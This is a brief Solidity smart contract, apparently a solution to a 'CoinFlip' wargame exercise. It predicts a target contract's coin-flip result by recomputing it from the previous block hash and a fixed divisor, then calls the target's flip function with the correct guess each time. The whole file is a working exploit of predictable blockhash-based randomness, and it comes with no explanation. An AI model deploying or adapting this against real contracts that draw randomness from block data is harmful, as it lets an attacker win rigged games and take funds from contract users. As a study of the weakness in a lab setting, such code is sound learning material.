// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract calculate_flip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinflipinstance;
    constructor(CoinFlip _coinFlipinstance){
        
        coinflipinstance = _coinFlipinstance ; 
    }

    function calculatee() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinflipinstance.flip(side);
    }
}